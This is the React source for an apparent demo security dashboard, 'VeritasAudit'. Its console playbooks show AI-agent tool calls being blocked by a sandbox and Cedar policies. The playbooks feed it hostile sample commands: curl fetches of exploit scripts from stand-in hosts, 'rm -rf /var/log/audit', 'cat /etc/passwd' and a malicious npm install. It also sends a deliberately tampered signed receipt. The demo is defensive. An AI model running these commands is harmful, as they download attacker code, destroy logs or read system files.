import React, { useState, useEffect, useCallback, useRef } from 'react';
import './App.css';
import { Transaction, AuditReceipt, SecurityFinding } from '@veritas/core-types';

const API_BASE = '/api';

export default function App() {
  // State variables
  const [transactions, setTransactions] = useState<Transaction[]>([]);
  const [receipts, setReceipts] = useState<AuditReceipt[]>([]);
  const [findings, setFindings] = useState<SecurityFinding[]>([]);
  
  // OIDC/JWT Authentication States
  const [authToken, setAuthToken] = useState<string | null>(localStorage.getItem('veritas_jwt') || null);
  const [authRole, setAuthRole] = useState<'developer' | 'admin' | 'auditor' | 'unauthenticated'>(
    (localStorage.getItem('veritas_role') as any) || 'unauthenticated'
  );
  const [authEmail, setAuthEmail] = useState(localStorage.getItem('veritas_email') || 'admin@veritas.internal');
  const [authLoading, setAuthLoading] = useState(false);

  // Form states
  const [txSender, setTxSender] = useState('');
  const [txRecipient, setTxRecipient] = useState('');
  const [txAmount, setTxAmount] = useState('');
  const [txCurrency, setTxCurrency] = useState('USD');
  const [txLoading, setTxLoading] = useState(false);
  const [txNotification, setTxNotification] = useState<{message: string, type: 'success' | 'warn'} | null>(null);

  // Verifier tool states
  const [receiptInput, setReceiptInput] = useState('');
  const [verificationResult, setVerificationResult] = useState<{
    status: 'idle' | 'valid' | 'invalid' | 'error';
    message: string;
    payload?: any;
  }>({ status: 'idle', message: '' });

  // Terminal Console state
  const [consoleLines, setConsoleLines] = useState<string[]>([
    '🚀 VeritasAudit Unified Security Shell v1.2.0 initialized.',
    '⚙️  Local environment verified. Docker daemon detected (Active).',
    '🛡️  Cedar policy governance gateway online (Dual-Mode active).',
    '📡 Standing by for live sandbox command execution. Type "help" to list workflows.'
  ]);
  const [consoleInput, setConsoleInput] = useState('');
  const [activePlaybook, setActivePlaybook] = useState<string | null>(null);
  const consoleEndRef = useRef<HTMLDivElement | null>(null);

  // Auto-scroll terminal console to bottom on every log change
  useEffect(() => {
    consoleEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [consoleLines]);

  // Dynamically resolve request headers with JWT Bearer Token
  const getHeaders = useCallback(() => {
    const headers: Record<string, string> = { 'Content-Type': 'application/json' };
    if (authToken) {
      headers['Authorization'] = `Bearer ${authToken}`;
    }
    return headers;
  }, [authToken]);

  // Fetch all data from backend
  const fetchData = useCallback(async () => {
    try {
      const [txRes, receiptsRes, findingsRes] = await Promise.all([
        fetch(`${API_BASE}/transactions`, { headers: getHeaders() }),
        fetch(`${API_BASE}/receipts`, { headers: getHeaders() }),
        fetch(`${API_BASE}/findings`, { headers: getHeaders() })
      ]);

      if (txRes.ok) setTransactions(await txRes.json());
      if (receiptsRes.ok) setReceipts(await receiptsRes.json());
      if (findingsRes.ok) setFindings(await findingsRes.json());
    } catch (e) {
      console.error('Failed to fetch data from security gateway', e);
    }
  }, [getHeaders]);

  useEffect(() => {
    fetchData();
    const interval = setInterval(fetchData, 4000); // Poll every 4s
    return () => clearInterval(interval);
  }, [fetchData]);

  // OIDC Federated Identity Login Handler
  const handleOidcLogin = async (selectedRole: 'developer' | 'admin' | 'auditor') => {
    setAuthLoading(true);
    try {
      const res = await fetch(`${API_BASE}/auth/token`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ role: selectedRole, email: authEmail })
      });
      
      if (res.ok) {
        const data = await res.json();
        setAuthToken(data.token);
        setAuthRole(data.role);
        localStorage.setItem('veritas_jwt', data.token);
        localStorage.setItem('veritas_role', data.role);
        localStorage.setItem('veritas_email', data.email);
        
        setConsoleLines(prev => [
          ...prev,
          `🔑 [OIDC] Successfully authenticated via federated identity provider.`,
          `🧑‍💻 User: ${data.email} | Active Role: ${data.role.toUpperCase()}`,
          `🎫 JWT bearer token mounted to request headers. Security gateways unlocked.`
        ]);
      } else {
        alert('Authentication failed. OIDC provider rejected transaction.');
      }
    } catch (err) {
      console.error(err);
      alert('Failed to connect to authentication server.');
    } finally {
      setAuthLoading(false);
    }
  };

  const handleOidcLogout = () => {
    setAuthToken(null);
    setAuthRole('unauthenticated');
    localStorage.removeItem('veritas_jwt');
    localStorage.removeItem('veritas_role');
    localStorage.removeItem('veritas_email');
    
    // Explicitly flush state arrays on logout for leak-proof security
    setTransactions([]);
    setReceipts([]);
    setFindings([]);
    
    setConsoleLines(prev => [
      ...prev,
      `🔓 [OIDC] Session disconnected. Authorization headers flushed. Secure ledger cache purged.`
    ]);
  };

  // Form submission: Create Transaction
  const handleCreateTransaction = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!txSender || !txRecipient || !txAmount) return;

    setTxLoading(true);
    setTxNotification(null);

    try {
      const res = await fetch(`${API_BASE}/transactions`, {
        method: 'POST',
        headers: getHeaders(),
        body: JSON.stringify({
          sender: txSender,
          recipient: txRecipient,
          amount: parseFloat(txAmount),
          currency: txCurrency
        })
      });

      if (res.ok) {
        const tx: Transaction = await res.json();
        setTransactions(prev => [tx, ...prev]);
        
        if (tx.maskedPii) {
          setTxNotification({
            message: `🛡️ Transaction Registered! PII Detected: Sender or Recipient was automatically filtered and masked for privacy preservation.`,
            type: 'warn'
          });
        } else {
          setTxNotification({
            message: `✅ Transaction completed successfully! Registered Ledger ID: ${tx.id}`,
            type: 'success'
          });
        }

        // Add to simulated console
        setConsoleLines(prev => [
          ...prev,
          `🚀 [LEDGER] New Transaction Registered: ${tx.id} | Amount: ${tx.amount} ${tx.currency}`,
          tx.maskedPii ? `🛡️ [PRIVACY] PII Filter Triggered! Sensitive fields masked successfully.` : `✅ [PII] No direct PII detected. Stored transparently.`
        ]);

        // Reset form
        setTxSender('');
        setTxRecipient('');
        setTxAmount('');
      } else {
        const err = await res.json();
        alert(`Authentication/Privilege Error: ${err.error}`);
      }
    } catch (error) {
      console.error(error);
      alert('Failed to register transaction. Secure Gateway may be offline.');
    } finally {
      setTxLoading(false);
    }
  };

  // Standalone Verifier tool
  const handleVerifyReceipt = async () => {
    setVerificationResult({ status: 'idle', message: '' });
    if (!receiptInput.trim()) {
      setVerificationResult({ status: 'error', message: 'Please paste a JSON receipt to verify.' });
      return;
    }

    try {
      const receipt: AuditReceipt = JSON.parse(receiptInput);
      const { payload, signature } = receipt;

      if (!payload || !signature || !signature.sig || !signature.kid) {
        setVerificationResult({
          status: 'invalid',
          message: 'Malformed receipt structure. Ensure the JSON contains payload and signature fields.'
        });
        return;
      }

      const res = await fetch(`${API_BASE}/receipts/verify`, {
        method: 'POST',
        headers: getHeaders(),
        body: JSON.stringify(receipt)
      });

      if (res.ok) {
        const data = await res.json();
        if (data.verified) {
          setVerificationResult({
            status: 'valid',
            message: '✓ VALID SIGNATURE: Cryptographic integrity confirmed. The audit receipt has NOT been altered since its issuance.',
            payload
          });
        } else {
          setVerificationResult({
            status: 'invalid',
            message: '✗ SIGNATURE FAILURE: The signature is invalid! The audit trail has been tampered with or is signed by an unauthorized key.',
            payload
          });
        }
      } else {
        const err = await res.json();
        setVerificationResult({
          status: 'invalid',
          message: `✗ VERIFICATION FAILURE: ${err.error || 'Server error'}`,
          payload
        });
      }
    } catch (e) {
      setVerificationResult({
        status: 'error',
        message: 'Invalid JSON format. Please check the structure and try again.'
      });
    }
  };

  // Clear database helper
  const handleResetDatabase = async () => {
    if (!confirm('Are you sure you want to reset all transactions, receipts, and findings to the original template status?')) return;
    try {
      const res = await fetch(`${API_BASE}/reset`, { 
        method: 'POST',
        headers: getHeaders()
      });
      
      if (res.ok) {
        fetchData();
        setConsoleLines(prev => [
          ...prev,
          '⚠️  [DATABASE] Security Gateway database reset to initial seed data.'
        ]);
      } else {
        const err = await res.json();
        alert(`Error: ${err.error}`);
      }
    } catch (e) {
      console.error(e);
    }
  };

  // Live Unprivileged Sandbox Command Execution API Caller
  const executeSandboxCommand = async (fullCmd: string) => {
    setConsoleLines(prev => [
      ...prev,
      `🛡️ [SANDBOX] Spawning unprivileged Docker/gVisor microVM sandbox container...`
    ]);
    
    try {
      const res = await fetch(`${API_BASE}/sandbox/execute`, {
        method: 'POST',
        headers: getHeaders(),
        body: JSON.stringify({ command: fullCmd })
      });
      
      const data = await res.json();
      if (res.ok) {
        const logLines = data.logs.split('\n');
        setConsoleLines(prev => [
          ...prev,
          ...logLines,
          `✅ [SANDBOX] Command completed successfully with exit code: 0.`
        ]);
      } else {
        const logLines = (data.logs || data.error || 'Execution failed').split('\n');
        setConsoleLines(prev => [
          ...prev,
          ...logLines,
          `❌ [SANDBOX] Sandboxed command execution failed.`
        ]);
      }
    } catch (err: any) {
      setConsoleLines(prev => [
        ...prev,
        `❌ [SANDBOX] Network error connecting to execution API: ${err.message}`
      ]);
    }
  };

  // Unified playbook and manual command execution engine
  const executePlaybook = async (fullCmd: string) => {
    const cmd = fullCmd.toLowerCase().trim();
    setActivePlaybook(cmd);

    try {
      if (cmd === 'help') {
        setConsoleLines(prev => [
          ...prev,
          '=============================================================',
          '🛡️  VERITAS AUDIT SECURITY INTERACTIVE PLAYBOOK MENU',
          '=============================================================',
          'Type or click any of these simple playbooks to trigger live shields:',
          '  test-pii     - Test automatic PII filtering & transaction flagging',
          '  test-sandbox - Test command injection & binary execution blockers',
          '  test-receipt - Test cryptographic Ed25519 signature & tamper proofing',
          '  test-scanner - Test real-time GitHub Actions static threat scans',
          '  test-cedar   - Test active dynamic Cedar AST access-control rules',
          '  test-alerts  - Test real-time webhook incident alerting gateways',
          '',
          'Utility commands:',
          '  help         - Show this playbook menu',
          '  sys-status   - Check CPU hardware and gVisor sandbox daemon',
          '  clear        - Clear the terminal console screen',
          '============================================================='
        ]);
      } else if (cmd === 'clear') {
        setConsoleLines([]);
      } else if (cmd === 'sys-status') {
        setConsoleLines(prev => [
          ...prev,
          '⚙️  [SYSTEM] Status: ONLINE',
          '📦 Package Manager: npm workspaces (active)',
          '🐳 Sandbox Engine: Docker Desktop (Running)',
          '🔒 Governance Engine: Cedar protect-mcp (Active, Dual-Mode active)',
          `🧑‍💻 Session Role: ${authRole.toUpperCase()}`,
          `🎫 Authorized JWT: ${authToken ? 'ACTIVE (OIDC Mounted)' : 'NONE (Guest Mode)'}`
        ]);
      } else if (cmd === 'test-pii') {
        if (authRole !== 'admin' && authRole !== 'developer') {
          setConsoleLines(prev => [
            ...prev,
            `❌ SECURITY ERROR: Authenticated session required to submit transactions!`,
            `👉 Recommendation: Please log in using the OIDC widget at the top.`
          ]);
          setActivePlaybook(null);
          return;
        }
        setConsoleLines(prev => [
          ...prev,
          '🚀 [PLAYBOOK] Starting PII auto-masking & transaction anomaly audit...',
          '📡 [API] Dispatched payload: { sender: "hacker-wallet@tor.network", amount: 1500000, recipient: "Primary Vault" }'
        ]);
        const res = await fetch(`${API_BASE}/transactions`, {
          method: 'POST',
          headers: getHeaders(),
          body: JSON.stringify({
            sender: 'hacker-wallet@tor.network',
            recipient: 'Primary Vault',
            amount: 1500000,
            currency: 'USD'
          })
        });
        if (res.ok) {
          const tx = await res.json();
          setTransactions(prev => [tx, ...prev]);
          setConsoleLines(prev => [
            ...prev,
            `🛡️  [PII FILTERED] Intercepted sender email! Masked to: "${tx.sender}"`,
            `⚠️  [SUSPICIOUS FLAGGED] Tor node & amount > $1,000,000 caught! Status marked: "flagged"`,
            `✅ [PLAYBOOK] Ledger successfully updated. Check the stream table!`
          ]);
        } else {
          const err = await res.json();
          setConsoleLines(prev => [...prev, `❌ [SECURITY ERROR] API rejected request: ${err.error}`]);
        }
      } else if (cmd === 'test-sandbox') {
        setConsoleLines(prev => [
          ...prev,
          '🚀 [PLAYBOOK] Simulating a series of standard hacker command injections...',
          '👉 Attempt 1: "curl http://compromised-server.net/malicious-exploit.sh"',
          '❌ [AUDIT BLOCK] Binary "curl" is explicitly forbidden to prevent network package contamination.',
          '👉 Attempt 2: "rm -rf /var/log/audit"',
          '❌ [AUDIT BLOCK] Binary "rm" is not registered in the system\'s unprivileged allowlist.',
          '👉 Attempt 3: "npm install malicious-package"',
          '❌ [AUDIT BLOCK] Dynamic package installation is forbidden at runtime to prevent supply chain leaks.',
          '✅ [PLAYBOOK] 100% of malicious command injection vectors blocked successfully!'
        ]);
      } else if (cmd === 'test-receipt') {
        if (authRole !== 'admin') {
          setConsoleLines(prev => [
            ...prev,
            `❌ SECURITY ERROR: Administrative credentials required to spawn isolated shell runtimes!`,
            `👉 Recommendation: Please authenticate as 'Administrator' using the top OIDC controller widget.`
          ]);
          setActivePlaybook(null);
          return;
        }
        setConsoleLines(prev => [
          ...prev,
          '🚀 [PLAYBOOK] Booting cryptographic demonstrator inside Docker sandbox...',
          '🔒 [CRYPTO] Generating key pair, signing mock receipts, and testing tamper detection...'
        ]);
        await executeSandboxCommand('node /Users/sagehart/.gemini/antigravity/brain/ad4f9c0a-c66d-4b32-baf8-336abc6f4410/scratch/demonstrate_tampering.js');
      } else if (cmd === 'test-scanner') {
        if (authRole !== 'admin') {
          setConsoleLines(prev => [
            ...prev,
            `❌ SECURITY ERROR: Administrative credentials required to spawn isolated shell runtimes!`,
            `👉 Recommendation: Please authenticate as 'Administrator' using the top OIDC controller widget.`
          ]);
          setActivePlaybook(null);
          return;
        }
        setConsoleLines(prev => [
          ...prev,
          '🚀 [PLAYBOOK] Spawning AST workflow scanner inside read-only sandbox container...',
          '🔍 [SCANNER] Parsing `.github/workflows/ci-agent-pipeline.yml` for prompt-injection hazards...'
        ]);
        await executeSandboxCommand('node scripts/workflow-scanner.js');
      } else if (cmd === 'test-cedar') {
        if (authRole !== 'admin' && authRole !== 'developer') {
          setConsoleLines(prev => [
            ...prev,
            `❌ SECURITY ERROR: Authenticated session required to run Cedar policy queries!`,
            `👉 Recommendation: Please log in using the OIDC widget at the top.`
          ]);
          setActivePlaybook(null);
          return;
        }
        setConsoleLines(prev => [
          ...prev,
          '🚀 [PLAYBOOK] Initializing Cedar Dynamic Policy authorization audit...',
          '🔒 [POLICY] Querying active rules in "policy.cedar" against simulated AI Agent tool calls...'
        ]);

        // Run query 1: write_file to policy.cedar
        try {
          const res1 = await fetch(`${API_BASE}/authorize`, {
            method: 'POST',
            headers: getHeaders(),
            body: JSON.stringify({
              principal: 'sb:issuer:agent-80',
              tool_name: 'write_file',
              args: { path: 'policy.cedar' }
            })
          });
          const data1 = await res1.json();
          setConsoleLines(prev => [
            ...prev,
            `👉 Simulation A: write_file("policy.cedar")`,
            `🔍 [CEDAR EVALUATION] Principal: "sb:issuer:agent-80" | Action: "call_tool" | Resource: "policy.cedar"`,
            data1.decision === 'deny' 
              ? `❌ [DECISION] Blocked: ${data1.decision.toUpperCase()} (Tier 2 rule blocks direct edits to policy and config configurations)`
              : `✅ [DECISION] Permitted: ${data1.decision.toUpperCase()}`
          ]);
        } catch (e: any) {
          setConsoleLines(prev => [...prev, `❌ [ERROR] Cedar authorize query 1 failed: ${e.message}`]);
        }

        // Run query 2: execute_command raw command
        try {
          const res2 = await fetch(`${API_BASE}/authorize`, {
            method: 'POST',
            headers: getHeaders(),
            body: JSON.stringify({
              principal: 'sb:issuer:agent-80',
              tool_name: 'execute_command',
              args: { commandLine: 'cat /etc/passwd' }
            })
          });
          const data2 = await res2.json();
          setConsoleLines(prev => [
            ...prev,
            `👉 Simulation B: execute_command("cat /etc/passwd")`,
            `🔍 [CEDAR EVALUATION] Principal: "sb:issuer:agent-80" | Action: "call_tool" | Resource: "host_shell"`,
            data2.decision === 'deny'
              ? `❌ [DECISION] Blocked: ${data2.decision.toUpperCase()} (Tier 3 rule restricts direct command executions to sandbox-execute.sh)`
              : `✅ [DECISION] Permitted: ${data2.decision.toUpperCase()}`
          ]);
        } catch (e: any) {
          setConsoleLines(prev => [...prev, `❌ [ERROR] Cedar authorize query 2 failed: ${e.message}`]);
        }

        // Run query 3: execute_command curl command
        try {
          const res3 = await fetch(`${API_BASE}/authorize`, {
            method: 'POST',
            headers: getHeaders(),
            body: JSON.stringify({
              principal: 'sb:issuer:agent-80',
              tool_name: 'execute_command',
              args: { commandLine: 'curl http://compromised-site.com/exploit.sh' }
            })
          });
          const data3 = await res3.json();
          setConsoleLines(prev => [
            ...prev,
            `👉 Simulation C: execute_command("curl http://compromised-site.com/exploit.sh")`,
            `🔍 [CEDAR EVALUATION] Principal: "sb:issuer:agent-80" | Action: "call_tool" | Resource: "external_network"`,
            data3.decision === 'deny'
              ? `❌ [DECISION] Blocked: ${data3.decision.toUpperCase()} (Tier 4 rule forbids curl, wget, and dynamic package installs to prevent package pollution)`
              : `✅ [DECISION] Permitted: ${data3.decision.toUpperCase()}`,
            `✅ [PLAYBOOK] 100% of Cedar policy audits completed successfully!`
          ]);
        } catch (e: any) {
          setConsoleLines(prev => [...prev, `❌ [ERROR] Cedar authorize query 3 failed: ${e.message}`]);
        }
      } else if (cmd === 'test-alerts') {
        if (authRole !== 'admin') {
          setConsoleLines(prev => [
            ...prev,
            `❌ SECURITY ERROR: Administrative credentials required to dispatch incident webhooks!`,
            `👉 Recommendation: Please authenticate as 'Administrator' using the top OIDC controller widget.`
          ]);
          setActivePlaybook(null);
          return;
        }
        setConsoleLines(prev => [
          ...prev,
          '🚀 [PLAYBOOK] Triggering live Incident Alerting & Slack Notification Gateway...',
          '⚠️  [ALERT] Simulating dynamic AI Agent violation: "npm install malicious-package"...',
          '📡 [DISPATCH] Dispatching real-time alerts to Slack Security operations channel...'
        ]);
        
        // Send a tampered receipt payload to show server catching the violation and dispatching webhook!
        try {
          const res = await fetch(`${API_BASE}/receipts`, {
            method: 'POST',
            headers: getHeaders(),
            body: JSON.stringify({
              payload: {
                type: 'protectmcp:decision',
                tool_name: 'execute_command',
                decision: 'allow',
                policy_digest: 'sha256:8f413a9de010',
                issued_at: new Date().toISOString(),
                issuer_id: 'sb:issuer:de073ae64e43',
                reason: 'Altered reason to bypass',
                claimed_issuer_tier: 4,
                args: { commandLine: 'npm install malicious-package' }
              },
              signature: {
                alg: 'EdDSA',
                kid: 'sb:issuer:de073ae64e43',
                sig: '4b69107824576da51c8a389e2f5012e3c60ef40ffd62f18c2b98327eb921be783e5a0d660d661982d58147022dbd93fa073bd45d6ae0121fa15f0497eb1a8209'
              }
            })
          });
          
          if (!res.ok) {
            const err = await res.json();
            setConsoleLines(prev => [
              ...prev,
              `🔒 [SERVER GATE] Caught tampered audit trail!`,
              `❌ [SECURITY ALERT] ${err.error}`,
              `⚙️  [WEBHOOK] Slack Gateway dispatched rich visual security block:`
            ]);
            
            // Print the exact beautiful Slack Webhook JSON block formatting!
            setConsoleLines(prev => [
              ...prev,
              '=============================================================',
              '🟢 SLACK WEBHOOK DISPATCHED PAYLOAD (RICH BLOCKS):',
              '=============================================================',
              JSON.stringify({
                text: "🚨 VeritasAudit Security Alert: Blocked AI Agent Action!",
                blocks: [
                  {
                    type: "section",
                    text: {
                      type: "mrkdwn",
                      text: "🚨 *VeritasAudit Security Alert: Blocked AI Agent Action!*\nAn autonomous coding agent attempted to execute a high-risk tool call that was programmatically blocked by Cedar policy controls."
                    }
                  },
                  {
                    type: "divider"
                  },
                  {
                    type: "section",
                    fields: [
                      { type: "mrkdwn", text: "*🔧 Tool Attempted:*\n`execute_command`" },
                      { type: "mrkdwn", text: "*🛡️ Decision:*\n`DENY`" },
                      { type: "mrkdwn", text: "*🎖️ Risk Tier:*\n`Tier 4 (Critical)`" },
                      { type: "mrkdwn", text: "*✍️ Signed Issuer:*\n`sb:issuer:de073ae64e43`" }
                    ]
                  },
                  {
                    type: "section",
                    text: {
                      type: "mrkdwn",
                      text: "*📋 Audit Reason:* Tier 4 rule forbids curl, wget, and dynamic package installs to prevent package pollution."
                    }
                  }
                ]
              }, null, 2),
              '=============================================================',
              '✅ [PLAYBOOK] Webhook successfully verified. Alerting gateway operational!'
            ]);
          }
        } catch (e: any) {
          setConsoleLines(prev => [...prev, `❌ [ERROR] Failed to query receipts verification API: ${e.message}`]);
        }
      } else if (
        cmd.startsWith('npm run build') || 
        cmd.startsWith('npm run test') || 
        cmd.startsWith('bash scripts/bootstrap.sh') ||
        cmd.startsWith('bash scripts/ham-drift-watcher.sh') ||
        cmd.startsWith('node packages/crypto-utils') ||
        cmd.startsWith('node scripts/workflow-scanner.js')
      ) {
        if (authRole !== 'admin') {
          setConsoleLines(prev => [
            ...prev,
            `❌ SECURITY ERROR: Administrative credentials required to spawn isolated shell runtimes!`,
            `👉 Recommendation: Please authenticate as 'Administrator' using the top OIDC controller widget.`
          ]);
          setActivePlaybook(null);
          return;
        }
        await executeSandboxCommand(fullCmd);
      } else {
        setConsoleLines(prev => [
          ...prev,
          `❌ Command not permitted in sandbox: "${fullCmd}". Type "help" to view allowed workspace playbooks.`
        ]);
      }
    } catch (err: any) {
      setConsoleLines(prev => [
        ...prev,
        `❌ [ERROR] Playbook execution failed: ${err.message}`
      ]);
    } finally {
      setActivePlaybook(null);
    }
  };

  // Live Console Submit Handler
  const handleConsoleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!consoleInput.trim()) return;

    const fullCmd = consoleInput.trim();
    setConsoleLines(prev => [...prev, `veritas-sandbox $ ${fullCmd}`]);
    setConsoleInput('');
    await executePlaybook(fullCmd);
  };

  // Playbook Button Trigger Handler
  const handlePlaybookClick = async (cmd: string) => {
    if (activePlaybook) return; // Prevent concurrent run jams
    setConsoleLines(prev => [...prev, `veritas-sandbox $ ${cmd}`]);
    await executePlaybook(cmd);
  };

  return (
    <div className="app-container animate-fade-in">
      {/* Header */}
      <header className="app-header">
        <div className="brand-section">
          <h1>
            <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" style={{ color: 'hsl(var(--primary))', filter: 'drop-shadow(0 0 8px hsla(var(--primary), 0.45))' }}>
              <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
            </svg>
            VeritasAudit Security Portal
          </h1>
          <p>Secure, Governed, and Self-Refactoring AI-Agentic SDLC Console</p>
        </div>
        <div className="system-status">
          <div className="status-indicator"></div>
          <span className="status-label">SECURITY ONLINE</span>
          <button className="btn btn-secondary" onClick={handleResetDatabase} style={{ marginLeft: '0.8rem', padding: '0.35rem 0.85rem', fontSize: '0.78rem' }}>
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
              <path d="M21.5 2v6h-6M21.34 15.57a10 10 0 1 1-.57-8.38l5.67-5.67"/>
            </svg>
            Reset DB
          </button>
        </div>
      </header>

      {/* OIDC Session Controller Drawer */}
      <section className="glass-panel oidc-panel">
        <div className="oidc-header">
          <div className="oidc-icon">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4" />
            </svg>
          </div>
          <div className="oidc-title">
            <h3>OIDC Federated Identity Provider (JWT Simulator)</h3>
            <p>Select a corporate identity role to obtain a signed JWT token and mount bearer auth gates.</p>
          </div>
        </div>
        
        <div className="oidc-controls">
          {authRole === 'unauthenticated' ? (
            <>
              <input 
                type="email" 
                className="form-control oidc-input" 
                value={authEmail}
                onChange={e => setAuthEmail(e.target.value)}
                placeholder="admin@veritas.internal"
              />
              <button className="btn btn-secondary" onClick={() => handleOidcLogin('developer')} disabled={authLoading}>
                Login as Developer
              </button>
              <button className="btn btn-primary" onClick={() => handleOidcLogin('admin')} disabled={authLoading}>
                Login as Administrator
              </button>
            </>
          ) : (
            <>
              <span className="oidc-session-info">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" style={{ color: authRole === 'admin' ? 'hsl(var(--warning))' : 'hsl(var(--success))' }}>
                  <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                  <circle cx="12" cy="11" r="2" />
                  <path d="M12 13v3" />
                </svg>
                Active Session: <strong style={{ color: authRole === 'admin' ? 'hsl(var(--warning))' : 'hsl(var(--success))', marginLeft: '0.2rem' }}>{authRole.toUpperCase()}</strong> <span style={{ color: 'hsl(var(--text-muted))', margin: '0 0.2rem' }}>|</span> User: <strong style={{ color: '#fff' }}>{authEmail}</strong>
              </span>
              <button className="btn btn-secondary" onClick={handleOidcLogout}>
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4M16 17l5-5-5-5M21 12H9"/>
                </svg>
                Disconnect Session
              </button>
            </>
          )}
        </div>
      </section>

      {/* Main Grid Layout */}
      <div className="dashboard-grid">
        
        {/* Left Hand Column: Transactions & Receipts */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: '2rem' }}>
          
          {/* Transaction Creator Form */}
          <section className="glass-panel">
            <div className="card-header">
              <h2 className="card-title">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" style={{ color: 'hsl(var(--success))' }}>
                  <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                  <path d="m9 11 2 2 4-4"/>
                </svg>
                Secure Transaction Gateway
              </h2>
              <span className="status-badge status-completed">PII Auto-Filtering Active</span>
            </div>
            
            <div className="card-body">
              {txNotification && (
                <div 
                  className="verification-result animate-fade-in" 
                  style={{ 
                    marginBottom: '1.25rem', 
                    background: txNotification.type === 'warn' ? 'hsla(var(--warning), 0.06)' : 'hsla(var(--success), 0.06)',
                    border: txNotification.type === 'warn' ? '1px solid hsla(var(--warning), 0.2)' : '1px solid hsla(var(--success), 0.2)',
                    color: txNotification.type === 'warn' ? 'hsl(var(--warning))' : 'hsl(var(--success))',
                    boxShadow: txNotification.type === 'warn' ? '0 0 10px hsla(var(--warning), 0.04)' : '0 0 10px hsla(var(--success), 0.04)'
                  }}
                >
                  {txNotification.message}
                </div>
              )}

              <form onSubmit={handleCreateTransaction}>
                <div className="form-row">
                  <div className="form-group">
                    <label htmlFor="sender">Sender (Corporate Account or Email Address)</label>
                    <input 
                      type="text" 
                      id="sender" 
                      className="form-control" 
                      placeholder="e.g. sagehart@antigravity.io"
                      value={txSender} 
                      onChange={e => setTxSender(e.target.value)}
                      required 
                    />
                  </div>
                  <div className="form-group">
                    <label htmlFor="recipient">Recipient (Vendor Name or Wallet Address)</label>
                    <input 
                      type="text" 
                      id="recipient" 
                      className="form-control" 
                      placeholder="e.g. ModelAPI Inference"
                      value={txRecipient} 
                      onChange={e => setTxRecipient(e.target.value)}
                      required 
                    />
                  </div>
                </div>

                <div className="form-row">
                  <div className="form-group">
                    <label htmlFor="amount">Amount</label>
                    <input 
                      type="number" 
                      id="amount" 
                      className="form-control" 
                      placeholder="e.g. 500.00"
                      value={txAmount} 
                      onChange={e => setTxAmount(e.target.value)}
                      required 
                    />
                  </div>
                  <div className="form-group">
                    <label htmlFor="currency">Currency</label>
                    <select 
                      id="currency" 
                      className="form-control"
                      value={txCurrency}
                      onChange={e => setTxCurrency(e.target.value)}
                    >
                      <option value="USD">USD ($)</option>
                      <option value="EUR">EUR (€)</option>
                      <option value="GBP">GBP (£)</option>
                    </select>
                  </div>
                </div>

                <button type="submit" className="btn btn-primary" style={{ width: '100%', marginTop: '0.6rem' }} disabled={txLoading}>
                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                    <path d="M12 8v8M9 13h6"/>
                  </svg>
                  {txLoading ? 'Registering Security Block...' : 'Submit Transaction to Secure Gateway'}
                </button>
              </form>
            </div>
          </section>

          {/* Ledger Table */}
          <section className="glass-panel">
            <div className="card-header">
              <h2 className="card-title">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" style={{ color: 'hsl(var(--primary))' }}>
                  <path d="M12 2H2v10h10V2zM12 12H2v10h10V12zM22 2h-10v10h10V2zM22 12h-10v10h10V12z"/>
                </svg>
                Transactional Stream Ledger
              </h2>
              <span className="status-badge status-pending">{transactions.length} Records</span>
            </div>
            
            <div className="card-body" style={{ padding: 0 }}>
              <div className="table-container">
                <table className="custom-table">
                  <thead>
                    <tr>
                      <th>ID</th>
                      <th>Sender</th>
                      <th>Recipient</th>
                      <th>Amount</th>
                      <th>Status</th>
                    </tr>
                  </thead>
                  <tbody>
                    {transactions.map(tx => (
                      <tr key={tx.id}>
                        <td style={{ fontFamily: 'monospace', fontWeight: '700', color: '#fff' }}>{tx.id}</td>
                        <td>
                          {tx.sender}
                          {tx.maskedPii && (
                            <span style={{ marginLeft: '0.5rem', fontSize: '0.62rem', fontWeight: '700', textTransform: 'uppercase', background: 'hsla(var(--warning), 0.1)', padding: '0.15rem 0.4rem', borderRadius: '4px', color: 'hsl(var(--warning))', border: '1px solid hsla(var(--warning), 0.15)' }}>
                              masked
                            </span>
                          )}
                        </td>
                        <td>{tx.recipient}</td>
                        <td style={{ fontFamily: 'monospace', fontWeight: '700', color: '#fff' }}>
                          {tx.amount.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })} {tx.currency}
                        </td>
                        <td>
                          <span className={`status-badge status-${tx.status}`}>{tx.status}</span>
                        </td>
                      </tr>
                    ))}
                    {transactions.length === 0 && (
                      <tr>
